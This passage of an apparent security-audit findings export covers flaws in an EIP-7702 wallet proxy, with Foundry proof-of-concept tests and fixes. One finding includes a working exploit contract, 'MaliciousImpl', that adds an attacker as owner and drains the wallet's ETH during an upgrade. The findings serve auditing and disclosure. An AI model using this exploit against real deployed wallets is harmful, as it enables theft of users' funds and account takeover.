transfer\");\n        }\n        balanceOf[msg.sender] -= _value;\n        balanceOf[_to] += _value;\n        return true;\n    }\n}\n\ncontract CoinbaseSmartWalletValidatorTest is Test {\n    uint256 constant _EOA_PRIVATE_KEY = 0xA11CE;\n    address payable _eoa;\n    uint256 constant _NEW_OWNER_PRIVATE_KEY = 0xB0B;\n    address payable _newOwner;\n\n    EIP7702Proxy _proxy;\n    CoinbaseSmartWallet _implementation;\n    NonceTracker _nonceTracker;\n    DefaultReceiver _receiver;\n    CoinbaseSmartWalletValidator _validator;\n    ERC223Token _token;\n\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    bytes32 _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n        \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n    );\n\n    function setUp() public {\n        _eoa = payable(vm.addr(_EOA_PRIVATE_KEY));\n        _newOwner = payable(vm.addr(_NEW_OWNER_PRIVATE_KEY));\n\n        _implementation = new CoinbaseSmartWallet();\n        _nonceTracker = new NonceTracker();\n        _receiver = new DefaultReceiver();\n        _validator = new CoinbaseSmartWalletValidator(_implementation);\n        _proxy = new EIP7702Proxy(address(_nonceTracker), address(_receiver));\n        _token = new ERC223Token();\n\n        vm.etch(_eoa, address(_proxy).code);\n    }\n\n    // Existing tests omitted for brevity\n\n    function test_reverts_ERC223Transfer_afterUpgrade() public {\n        // Initialize proxy with an owner\n        bytes memory initArgs = _createInitArgs(_newOwner);\n        bytes memory signature =\n            _signSetImplementationData(_EOA_PRIVATE_KEY, initArgs, address(_implementation), address(_validator));\n        EIP7702Proxy(_eoa).setImplementation(address(_implementation), initArgs, address(_validator), signature, true);\n\n        // Verify proxy has code (simulating EIP-7702 upgrade)\n        assertGt(_eoa.code.length, 0, \"EOA should have code after upgrade\");\n\n        // Attempt ERC-223 transfer\n        vm.prank(address(this)); // Token deployer has initial supply\n        vm.expectRevert(\"Recipient rejected transfer\");\n        _token.transfer(_eoa, 100e18, \"\");\n\n        // Attempt ERC-223 transfer with data\n        vm.prank(address(this));\n        vm.expectRevert(\"Recipient rejected transfer\");\n        _token.transfer(_eoa, 100e18, hex\"1234\");\n    }\n\n    // Helper functions from original suite\n    function _createInitArgs(address owner) internal pure returns (bytes memory) {\n        bytes[] memory owners = new bytes[](1);\n        owners[0] = abi.encode(owner);\n        bytes memory ownerArgs = abi.encode(owners);\n        return abi.encodePacked(CoinbaseSmartWallet.initialize.selector, ownerArgs);\n    }\n\n    function _signSetImplementationData(\n        uint256 signerPk,\n        bytes memory initArgs,\n        address implementation,\n        address validator\n    ) internal view returns (bytes memory) {\n        bytes32 initHash = keccak256(\n            abi.encode(\n                _IMPLEMENTATION_SET_TYPEHASH,\n                0,\n                _proxy,\n                _nonceTracker.nonces(_eoa),\n                _getERC1967Implementation(address(_eoa)),\n                address(implementation),\n                keccak256(initArgs),\n                address(validator)\n            )\n        );\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, initHash);\n        return abi.encodePacked(r, s, v);\n    }\n\n    function _getERC1967Implementation(address proxy) internal view returns (address) {\n        return address(uint160(uint256(vm.load(proxy, _IMPLEMENTATION_SLOT))));\n    }\n}\n```\n- Run the test\n```bash\nforge test --mt test_reverts_ERC223Transfer_afterUpgrade\n```\n\n\n## Recommendation\nAdd tokenReceived to DefaultReceiver (since it handles token callbacks) to ensure ERC-223 support:"}, "locations": [{"physicalLocation": {"artifactLocation": {"uri": "README.md"}, "region": {"startLine": 1, "endLine": 1}}}], "partialFingerprints": {"primaryLocationLineHash": "832dd8ff-da0d-4dda-af97-fbb4a8502227-README-1"}}, {"ruleId": "f0bf3745-f709-46bd-a159-ef37438c4260", "level": "note", "message": {"text": "## Summary\nThe `setImplementation` function lacks the payable modifier, which prevents the contract from sending ETH during an upgrade. This makes it impossible for the owner to call payable functions in the new implementation during the initialization call, thereby breaking potential call combinations that require ETH transfers.\n\n## Finding Description\nThe `setImplementation` function currently does not have the payable modifier, which means that when it calls `upgradeToAndCall`, it cannot transfer ETH. As a result:\n- Any new implementation that requires ETH during initialization cannot receive it.\n- Certain upgrade scenarios that rely on ETH being sent along with the initialization call will fail.\n- The default upgradeToAndCall function typically allows ETH transfers, but this function does not, limiting its flexibility compared to standard implementations.\n\n## Impact Explanation\nThis issue is low severity because it does not introduce an exploitable vulnerability but instead restricts contract functionality. Users expecting to call payable functions in the new implementation immediately after an upgrade will be unable to do so, potentially requiring workarounds or additional transactions.\n\n## Likelihood Explanation\nThe likelihood is low because this issue only affects users who attempt to upgrade to an implementation that requires ETH during initialization. However, for those affected, it could introduce operational inconvenience and inefficiencies.\n\n## Recommendation\nadd payable to the `setImplementation` function"}, "locations": [{"physicalLocation": {"artifactLocation": {"uri": "README.md"}, "region": {"startLine": 1, "endLine": 1}}}], "partialFingerprints": {"primaryLocationLineHash": "f0bf3745-f709-46bd-a159-ef37438c4260-README-1"}}, {"ruleId": "99a3e9d8-490c-4955-9a21-701cc28614f2", "level": "error", "message": {"text": "## **01. Summary**\n\nThe `setImplementation` function in the EIP7702Proxy contract lacks a deadline check for signatures. This allows a signed message to remain valid indefinitely, potentially leading to unintended usage across different chains or at a later time.\n\n## **02. Vulnerability Details**\n\nThe user can set a new implementation using the `setImplementation` function. This requires an EOA signature, which is verified against a hash constructed as follows:\n\n```solidity\nbytes32 hash = keccak256(\n    abi.encode(\n        _IMPLEMENTATION_SET_TYPEHASH,\n        allowCrossChainReplay ? 0 : block.chainid,\n        _proxy,\n        nonceTracker.useNonce(),\n        ERC1967Utils.getImplementation(),\n        newImplementation,\n        keccak256(callData),\n        validator\n    )\n);\n```\n\nThe function uses this hash to verify the signature. However, there is no deadline or expiration mechanism, meaning the signature can be reused indefinitely if allowCrossChainReplay is enabled or if the nonce remains valid.\n\n## **03. Impact**\n\nIf `allowCrossChainReplay` is set to `true`, the signature can be reused across multiple chains. This could allow an attacker or unintended party to apply the signature on a different chain or at a later time, potentially causing unexpected behavior or unauthorized upgrades to the contract\u2019s implementation.\n\n## **04. Proof of Concept**\n\nThe proof of concept demonstrates that a signature remains valid even after a significant time delay (e.g., 10 years). The test signs a message, waits, and then successfully uses the same signature to call `setImplementation`. \n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.23;\n\nimport {CoinbaseSmartWallet} from \"../lib/smart-wallet/src/CoinbaseSmartWallet.sol\";\n\nimport {EIP7702Proxy} from \"../src/EIP7702Proxy.sol\";\nimport {NonceTracker} from \"../src/NonceTracker.sol\";\nimport {DefaultReceiver} from \"../src/DefaultReceiver.sol\";\nimport {CoinbaseSmartWalletValidator} from \"../src/validators/CoinbaseSmartWalletValidator.sol\";\n\nimport {StorageSlot} from \"openzeppelin-contracts/contracts/utils/StorageSlot.sol\";\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\n/**\n * @title CoinbaseImplementationTest\n * @dev Tests specific to the CoinbaseSmartWallet implementation\n */\ncontract CoinbaseImplementationTest is Test {\n    uint256 constant _EOA_PRIVATE_KEY = 0xA11CE;\n    address payable _eoa;\n\n    uint256 constant _NEW_OWNER_PRIVATE_KEY = 0xB0B;\n    address payable _newOwner;\n\n    CoinbaseSmartWallet _wallet;\n    CoinbaseSmartWallet _cbswImplementation;\n\n    // core contracts\n    EIP7702Proxy _proxy;\n    NonceTracker _nonceTracker;\n    DefaultReceiver _receiver;\n    CoinbaseSmartWalletValidator _cbswValidator;\n\n    // constants\n    bytes4 constant ERC1271_MAGIC_VALUE = 0x1626ba7e;\n    bytes4 constant ERC1271_FAIL_VALUE = 0xffffffff;\n\n    /// @dev Storage slot with the address of the current implementation (ERC1967)\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    bytes32 _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n        \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n    );\n\n    function setUp() public virtual {\n        // Set up test accounts\n        _eoa = payable(vm.addr(_EOA_PRIVATE_KEY));\n        _newOwner = payable(vm.addr(_NEW_OWNER_PRIVATE_KEY));\n\n        // Deploy core contracts\n        _cbswImplementation = new CoinbaseSmartWallet();\n        _nonceTracker = new NonceTracker();\n        _receiver = new DefaultReceiver();\n        _cbswValidator = new CoinbaseSmartWalletValidator(_cbswImplementation);\n\n        // Deploy proxy with receiver and nonce tracker\n        _proxy = new EIP7702Proxy(address(_nonceTracker), address(_receiver));\n\n        // Get the proxy's runtime code\n        bytes memory proxyCode = address(_proxy).code;\n\n        // Etch the proxy code at the target address\n        vm.etch(_eoa, proxyCode);\n    }\n\n    // ======== PoC ========\n    function test_missingDeadlineCheck() public {\n        \n         // 1. The user signs a message to set the implementation.\n        bytes memory initArgs = _createInitArgs(_newOwner);\n        bytes memory signature = _signSetImplementationData(_EOA_PRIVATE_KEY, initArgs, address(_cbswImplementation));\n\n        // 2. A significant amount of time passes after the user signs the message.\n        skip(365 days * 10);\n\n        // 3. The signature is still valid despite the long delay.\n        EIP7702Proxy(_eoa).setImplementation(\n            address(_cbswImplementation),\n            initArgs,\n            address(_cbswValidator),\n            signature,\n            true\n        );\n    }\n\n    // ======== Utility Functions ========\n    /**\n     * @dev Creates initialization arguments for CoinbaseSmartWallet\n     * @param owner Address to set as the initial owner\n     * @return Encoded initialization arguments for CoinbaseSmartWallet\n     */\n    function _createInitArgs(address owner) internal pure returns (bytes memory) {\n        bytes[] memory owners = new bytes[](1);\n        owners[0] = abi.encode(owner);\n        bytes memory ownerArgs = abi.encode(owners);\n        return abi.encodePacked(CoinbaseSmartWallet.initialize.selector, ownerArgs);\n    }\n\n    /**\n     * @dev Signs initialization data for CoinbaseSmartWallet that will be verified by the proxy\n     * @param signerPk Private key of the signer\n     * @param initArgs Initialization arguments to sign\n     * @return Signature bytes\n     */\n    function _signSetImplementationData(uint256 signerPk, bytes memory initArgs, address implementation) internal view returns (bytes memory) {\n        bytes32 initHash = keccak256(\n            abi.encode(\n                _IMPLEMENTATION_SET_TYPEHASH,\n                0, // chainId 0 for cross-chain\n                _proxy,\n                _nonceTracker.nonces(_eoa),\n                _getERC1967Implementation(address(_eoa)),\n                implementation,\n                keccak256(initArgs),\n                address(_cbswValidator)\n            )\n        );\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, initHash);\n        return abi.encodePacked(r, s, v);\n    }\n\n    /**\n     * @dev Helper to read the implementation address from ERC1967 storage slot\n     * @param proxy Address of the proxy contract to read from\n     * @return The implementation address stored in the ERC1967 slot\n     */\n    function _getERC1967Implementation(address proxy) internal view returns (address) {\n        return address(uint160(uint256(vm.load(proxy, _IMPLEMENTATION_SLOT))));\n    }\n\n    /**\n     * @dev Helper to create ECDSA signatures\n     * @param pk Private key to sign with\n     * @param hash Message hash to sign\n     * @return signature Encoded signature bytes\n     */\n    function _sign(uint256 pk, bytes32 hash) internal pure returns (bytes memory signature) {\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);\n        return abi.encodePacked(r, s, v);\n    }\n\n}\n```\n\nTo execute the PoC, place the above **`PoC.t.sol`** file in the **`/test`** directory and run the following command:\n\n```solidity\n$ forge test --mt test_missingDeadlineCheck -vv\n\nRan 1 test for test/PoC.t.sol:CoinbaseImplementationTest\n[PASS] test_missingDeadlineCheck() (gas: 212484)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.15ms (3.92ms CPU time)\n\nRan 1 test suite in 255.74ms (18.15ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n## 05. **Tools Used**\n\nManual Code Review and Foundry\n\n## **06. Recommended Mitigation**\n\nAdd a `deadline` parameter to the `setImplementation` function and include it in the hash calculation. Verify that the deadline has not passed by comparing it to `block.timestamp`. For example:\n\n```diff\nbytes32 internal constant _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n-   \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n+   \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator,uint256 deadline)\"\n);\n\n\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay,\n+   uint256 deadline\n) external {\n+   require(block.timestamp <= deadline, \"Signature expired\");\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator,\n+           deadline\n        )\n    );\n    // Rest of the function remains the same\n}\n```"}, "locations": [{"physicalLocation": {"artifactLocation": {"uri": "README.md"}, "region": {"startLine": 1, "endLine": 1}}}], "partialFingerprints": {"primaryLocationLineHash": "99a3e9d8-490c-4955-9a21-701cc28614f2-README-1"}}, {"ruleId": "b3ee8e44-7ef3-4d22-9afd-5001166693bb", "level": "note", "message": {"text": "## **01. Summary**\n\nA vulnerability has been identified in the **`EIP7702Proxy`** contract that allows an attacker to bypass the **`AccountStateValidator`**. By exploiting the **`setImplementation`** function, an attacker can register a malicious implementation, perform unauthorized actions, and take control of the user's account. This vulnerability poses a significant risk to users' assets managed by the affected proxy contracts.\n\n## **02. Vulnerability Details**\n\nUsers of the **`EIP7702Proxy`** contract can register a new implementation by invoking the **`setImplementation`** function. This function utilizes a validator to verify the updated state and implementation. \n\n```solidity\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n\n    // Verify signature is from this address (the EOA)\n    address signer = ECDSA.recover(hash, signature);\n    if (signer != address(this)) revert InvalidSignature();\n\n    // Reset the implementation slot and call initialization if provided\n    ERC1967Utils.upgradeToAndCall(newImplementation, callData);\n\n    // Validate wallet state after upgrade, reverting if invalid\n    bytes4 validationResult =\n        IAccountStateValidator(validator).validateAccountState(address(this), ERC1967Utils.getImplementation());\n    if (validationResult != ACCOUNT_STATE_VALIDATION_SUCCESS) revert InvalidValidation();\n}\n```\n\nHowever, there is a way to bypass this validator. The verification process using the validator takes place after the upgradeToAndCall function is executed. As a result, if a malicious implementation is registered, it can perform harmful actions first, then appropriately update the account state and modify the implementation to bypass the validation.\n\nThe critical issue arises because the validator's verification happens post-upgrade, allowing the malicious implementation to manipulate the contract state and bypass necessary validations.\n\nAdditionally, the setImplementation function can also bypass the Validator\u2019s verification through reentrancy in the upgradeToAndCall function. However, in this case, the user would need to sign the malicious hash twice, making it difficult to exploit.\n\n## **03. Impact**\n\nIf this vulnerability is exploited, an attacker can steal all of a user's assets or execute any desired actions on the user's account, resulting in an extremely critical impact. However, to carry out such an attack, the user must sign a transaction authorizing the malicious implementation, which significantly reduces the likelihood to very low.\n\nDespite the low likelihood, the severity is considered medium because the AccountStateValidator responsible for verifying the account state and the newly registered implementation may not function correctly. This flaw can lead users to place undue trust in the validator, causing them to inadvertently sign hashes that include malicious implementations.\n\nAdditionally, since the protocol is a wallet protocol that can be widely adopted across multiple platforms, the presence of frontends provided by the protocol does not sufficiently mitigate the risk. This widespread usage increases the potential for the vulnerability to manifest, reinforcing the classification of this issue as having medium severity.\n\n## **04. Proof of Concept**\n\nThe following Proof of Concept (PoC) demonstrates how the vulnerability can be exploited. By deploying a malicious implementation and interacting with the **`setImplementation`** function, an attacker can drain the user's funds and take ownership of the account.\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.23;\n\nimport {CoinbaseSmartWallet} from \"../lib/smart-wallet/src/CoinbaseSmartWallet.sol\";\n\nimport {EIP7702Proxy} from \"../src/EIP7702Proxy.sol\";\nimport {NonceTracker} from \"../src/NonceTracker.sol\";\nimport {DefaultReceiver} from \"../src/DefaultReceiver.sol\";\nimport {CoinbaseSmartWalletValidator} from \"../src/validators/CoinbaseSmartWalletValidator.sol\";\n\nimport {StorageSlot} from \"openzeppelin-contracts/contracts/utils/StorageSlot.sol\";\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\n/**\n * @title CoinbaseImplementationTest\n * @dev Tests specific to the CoinbaseSmartWallet implementation\n */\ncontract CoinbaseImplementationTest is Test {\n    uint256 constant _EOA_PRIVATE_KEY = 0xA11CE;\n    address payable _eoa;\n\n    uint256 constant _NEW_OWNER_PRIVATE_KEY = 0xB0B;\n    address payable _newOwner;\n\n    CoinbaseSmartWallet _wallet;\n    CoinbaseSmartWallet _cbswImplementation;\n\n    // core contracts\n    EIP7702Proxy _proxy;\n    NonceTracker _nonceTracker;\n    DefaultReceiver _receiver;\n    CoinbaseSmartWalletValidator _cbswValidator;\n\n    // constants\n    bytes4 constant ERC1271_MAGIC_VALUE = 0x1626ba7e;\n    bytes4 constant ERC1271_FAIL_VALUE = 0xffffffff;\n\n    /// @dev Storage slot with the address of the current implementation (ERC1967)\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    bytes32 _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n        \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n    );\n\n    function setUp() public virtual {\n        // Set up test accounts\n        _eoa = payable(vm.addr(_EOA_PRIVATE_KEY));\n        _newOwner = payable(vm.addr(_NEW_OWNER_PRIVATE_KEY));\n\n        // Deploy core contracts\n        _cbswImplementation = new CoinbaseSmartWallet();\n        _nonceTracker = new NonceTracker();\n        _receiver = new DefaultReceiver();\n        _cbswValidator = new CoinbaseSmartWalletValidator(_cbswImplementation);\n\n        // Deploy proxy with receiver and nonce tracker\n        _proxy = new EIP7702Proxy(address(_nonceTracker), address(_receiver));\n\n        // Get the proxy's runtime code\n        bytes memory proxyCode = address(_proxy).code;\n\n        // Etch the proxy code at the target address\n        vm.etch(_eoa, proxyCode);\n    }\n\n    // ======== PoC ========\n    function test_exploitValidatorBypass() public {\n\n        // 1. Fund EOA with 10 ETH\n        vm.deal(_eoa, 10 ether);\n        address attacker = makeAddr(\"attacker\");\n\n        emit log_named_decimal_uint(\"[Start] EOA ETH balance\", _eoa.balance, 18);\n        emit log_named_decimal_uint(\"[Start] Attacker ETH balance\", attacker.balance, 18);\n\n        // 2. Deploy malicious contract\n        MaliciousImpl maliciousImpl = new MaliciousImpl(address(_cbswImplementation), attacker);\n        \n        // 3. EOA sets a compromised implementation\n        // Despite using a trusted _cbswValidator, replacing the implementation with maliciousImpl does not revert.\n        bytes memory initArgs = _createInitArgs(_newOwner);\n        bytes memory signature = _signSetImplementationData(_EOA_PRIVATE_KEY, initArgs, address(maliciousImpl));\n\n        EIP7702Proxy(_eoa).setImplementation(\n            address(maliciousImpl),\n            initArgs,\n            address(_cbswValidator),\n            signature,\n            true\n        );\n\n        // 4. Attacker drains EOA\u2019s ETH and takes ownership\n        emit log_named_decimal_uint(\"[End] EOA ETH balance\", _eoa.balance, 18);\n        emit log_named_decimal_uint(\"[End] Attacker ETH balance\", attacker.balance, 18);\n\n        assertEq(true, CoinbaseSmartWallet(_eoa).isOwnerAddress(attacker));\n        console.log(\"Attacker now owns EOA\");\n\n        // Logs:\n        //     [Start] EOA ETH balance: 10.000000000000000000\n        //     [Start] Attacker ETH balance: 0.000000000000000000\n        //     [End] EOA ETH balance: 0.000000000000000000\n        //     [End] Attacker ETH balance: 10.000000000000000000\n    }\n\n    // ======== Utility Functions ========\n    /**\n     * @dev Creates initialization arguments for CoinbaseSmartWallet\n     * @param owner Address to set as the initial owner\n     * @return Encoded initialization arguments for CoinbaseSmartWallet\n     */\n    function _createInitArgs(address owner) internal pure returns (bytes memory) {\n        bytes[] memory owners = new bytes[](1);\n        owners[0] = abi.encode(owner);\n        bytes memory ownerArgs = abi.encode(owners);\n        return abi.encodePacked(CoinbaseSmartWallet.initialize.selector, ownerArgs);\n    }\n\n    /**\n     * @dev Signs initialization data for CoinbaseSmartWallet that will be verified by the proxy\n     * @param signerPk Private key of the signer\n     * @param initArgs Initialization arguments to sign\n     * @return Signature bytes\n     */\n    function _signSetImplementationData(uint256 signerPk, bytes memory initArgs, address implementation) internal view returns (bytes memory) {\n        bytes32 initHash = keccak256(\n            abi.encode(\n                _IMPLEMENTATION_SET_TYPEHASH,\n                0, // chainId 0 for cross-chain\n                _proxy,\n                _nonceTracker.nonces(_eoa),\n                _getERC1967Implementation(address(_eoa)),\n                implementation,\n                keccak256(initArgs),\n                address(_cbswValidator)\n            )\n        );\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, initHash);\n        return abi.encodePacked(r, s, v);\n    }\n\n    /**\n     * @dev Helper to read the implementation address from ERC1967 storage slot\n     * @param proxy Address of the proxy contract to read from\n     * @return The implementation address stored in the ERC1967 slot\n     */\n    function _getERC1967Implementation(address proxy) internal view returns (address) {\n        return address(uint160(uint256(vm.load(proxy, _IMPLEMENTATION_SLOT))));\n    }\n\n    /**\n     * @dev Helper to create ECDSA signatures\n     * @param pk Private key to sign with\n     * @param hash Message hash to sign\n     * @return signature Encoded signature bytes\n     */\n    function _sign(uint256 pk, bytes32 hash) internal pure returns (bytes memory signature) {\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);\n        return abi.encodePacked(r, s, v);\n    }\n\n}\n\ncontract MaliciousImpl {\n\n    struct MultiOwnableStorage {\n        uint256 nextOwnerIndex;\n        uint256 removedOwnersCount;\n        mapping(uint256 index => bytes owner) ownerAtIndex;\n        mapping(bytes bytes_ => bool isOwner_) isOwner;\n    }\n\n    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    bytes32 private constant MUTLI_OWNABLE_STORAGE_LOCATION = 0x97e2c6aad4ce5d562ebfaa00db6b9e0fb66ea5d8162ed5b243f51a2e03086f00;\n\n    address immutable supportedImplementation;\n    address payable immutable attackerAddress;\n\n    constructor(address _supportedImplementation, address _attackerAddress) {\n        supportedImplementation = _supportedImplementation;\n        attackerAddress = payable(_attackerAddress);\n    }\n\n    function initialize(bytes[] calldata owners) external payable virtual {\n        evilExecute();\n        _setImplementation(supportedImplementation);\n    }\n\n    function evilExecute() public {\n        _addOwnerAtIndex(abi.encode(address(attackerAddress)));\n\n        (bool success, ) = attackerAddress.call{value: address(this).balance}(\"\");\n        require(success, \"failed evilExecute\");\n    }\n\n    function _addOwnerAtIndex(bytes memory owner) internal virtual {\n        MultiOwnableStorage storage $;\n\n        assembly (\"memory-safe\") {\n            $.slot := MUTLI_OWNABLE_STORAGE_LOCATION\n        }\n\n        $.isOwner[owner] = true;\n        $.ownerAtIndex[$.nextOwnerIndex] = owner;\n        $.nextOwnerIndex++;\n    }\n\n    function _setImplementation(address newImplementation) internal {\n        StorageSlot.AddressSlot storage $;\n\n        assembly (\"memory-safe\") {\n            $.slot := IMPLEMENTATION_SLOT\n        }\n\n        $.value = newImplementation;\n    }\n}\n```\n\nTo execute the PoC, place the above **`PoC.t.sol`** file in the **`/test`** directory and run the following command:\n\n```\n$ forge test --mt test_exploitValidatorBypass -vv\n\nRan 1 test for test/PoC.t.sol:CoinbaseImplementationTest\n[PASS] test_exploitValidatorBypass() (gas: 774399)\nLogs:\n  [Start] EOA ETH balance: 10.000000000000000000\n  [Start] Attacker ETH balance: 0.000000000000000000\n  [End] EOA ETH balance: 0.000000000000000000\n  [End] Attacker ETH balance: 10.000000000000000000\n  Attacker now owns EOA\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 19.88ms (6.89ms CPU time)\n```\n\nThe execution results demonstrate that the attacker successfully drained all ETH from the EOA and gained ownership of the wallet.\n\n## 05. **Tools Used**\n\nManual Code Review and Foundry\n\n## **06. Recommended Mitigation**\n\nTo mitigate this vulnerability, implement additional validation for the **`newImplementation`** address within the **`setImplementation`** function. This ensures that only trusted implementations can be registered, preventing unauthorized upgrades.\n\n```diff\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n\n    // Verify signature is from this address (the EOA)\n    address signer = ECDSA.recover(hash, signature);\n    if (signer != address(this)) revert InvalidSignature();\n\n+   // Add a function to AccountStateValidator to verify whether newImplementation is valid.\n+   if (IAccountStateValidator(validator).validateNewImplementation(newImplementation)) {\n+       revert InvalidImplementation();\n+   }\n\n    // Reset the implementation slot and call initialization if provided\n    ERC1967Utils.upgradeToAndCall(newImplementation, callData);\n\n    // Validate wallet state after upgrade, reverting if invalid\n    bytes4 validationResult =\n       IAccountStateValidator(validator).validateAccountState(address(this), ERC1967Utils.getImplementation());\n        \n    if (validationResult != ACCOUNT_STATE_VALIDATION_SUCCESS) revert InvalidValidation();\n}\n```"}, "locations": [{"physicalLocation": {"artifactLocation": {"uri": "README.md"}, "region": {"startLine": 1, "endLine": 1}}}], "partialFingerprints": {"primaryLocationLineHash": "b3ee8e44-7ef3-4d22-9afd-5001166693bb-README-1"}}, {"ruleId": "ecc6e1ee-d31c-4865-8922-6943877c689f", "level": "error", "message": {"text": "## Summary\n\nSigning a chain agnostic payload assumes that `newImplementation` , `nonceTracker`, and `_receiver`, (and to a lesser extent `validator`), are all trusted by the user. This is fine in the case of a single chain since they can be trivially checked to be clearly safe. \n\nHowever, this cannot be assumed safe if designed to be replayed on other chains because these addresses can have malicious implementations on other chains.\n\n## Finding Description\n\nWhile it's possible that Coinbase will use safe deployment practices, it's both not guaranteed by the code, and the proxy is designed to be generic. **The generic chain-agnostic payload is unsafely signed.**\n\nSome examples of how the implementations could differ maliciously:\n1. One of these dependency contracts on the first chain could have been deployed via create instead of create2, allowing the deployer to use different code on other chains. \n2. The original addresses can be proxy addresses, and be under different control on the other chains.\n3. The chain can have built-in upgradability, and allow the deployer to update contracts. \n4. The chain can support metamorphic contracts (via non-6780 selfdestruct).\n5. Etc.. \n\nExample scenario:\n1. User signs a chain-agnostic EIP-7702 tuple and a chain-agnostic initialization payload.\n2. The deployer account that was used to deploy a honest **Implementation**, **NonceTracker**, or **DefaultReceiver** is compromized. Possibly long after it's no longer in active use.\n3. On another chain, a malicious **implementation**, or malicious **nonce tracker** (allowing replay), or malicious **default receiver** (allowing adding owners in storage prior to init) are deployed at the originally signed addresses. \n4. The auth tuple and init payload are replayed, allowing the user's funds to be compromized.\n5. Alternatively, even if the user has no funds on the other chain, since the EOA will be highjacked there, it may be able to originate cross chain messages that will compromize the EOA's funds on other chains.\n\n## Impact Explanation\n\nMalicious take over of users' EOAs. High impact.\n\n## Likelihood Explanation\n\nLow/Medium likelihood, but of several independent different scenarios.\n\nFor example, create (instead of create2) is what's currently used in the [the deployment script (separate branch)](https://github.com/base/eip-7702-proxy/blob/09bc6c797e99912ca0768cdafcb67252e2fdec59/scripts/Deploy.s.sol#L22-L33) for the same repo. All that's needed for the attack in that case, is that far in the future, someone gains access to the no-longer used private key that was used to broadcast the script originally.\n\n## Recommendation\n\n- Add the codehashes of `newImplementation`,  `nonceTracker`, `_receiver`,  `validator` into the payload, and add a warning about the potential dangers of contracts on other chains having different trust and immutability assumptions.\n- Alternatively, use a single factory to deploy all contracts trusted by the system (instead of linking already deployed contracts), sign off on the factory, and get the dependency addresses directly from the factory."}, "locations": [{"physicalLocation": {"artifactLocation": {"uri": "README.md"}, "region": {"startLine": 1, "endLine": 1}}}], "partialFingerprints": {"primaryLocationLineHash": "ecc6e1ee-d31c-4865-8922-6943877c689f-README-1"}}]}]}
